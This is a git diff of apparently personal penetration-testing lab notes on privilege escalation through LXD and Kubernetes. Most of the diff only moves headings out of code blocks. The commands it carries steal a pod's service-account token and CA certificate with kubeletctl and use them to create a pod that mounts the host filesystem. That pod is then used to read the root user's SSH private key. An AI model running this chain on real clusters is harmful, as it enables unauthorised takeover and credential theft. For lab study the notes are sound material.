@@ -1,7 +1,7 @@
 # LXC / LXD
 LXD is similar to Docker and is Ubuntu's container manager.
 
-Unzip the Alpine image.
+Unzip the Alpine image.# 
 
  ```
 devops@NIX02:~$ unzip alpine.zip 
@@ -90,18 +90,21 @@ kubeletctl -i --server 10.129.10.11 scan rce
 ```
 
 Priv Esc
+Extracting TOken
 ```
-# Extracting TOken
 kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
-
-# Extracting Certification
+```
+Extracting Certification
+```
 kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
-
-# List Privileges
+```
+List Privileges
+```
 export token=`cat k8.token`
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
-
-# Creating .yaml
+```
+Creating .yaml
+```
 apiVersion: v1
 kind: Pod
 metadata:
@@ -120,11 +123,13 @@ spec:
        path: /
   automountServiceAccountToken: true
   hostNetwork: true
-
-# Creating new Pod
+```
+Creating new Pod
+```
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
-
-# Escalation
+```
+Escalation
+```
 kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
 ```
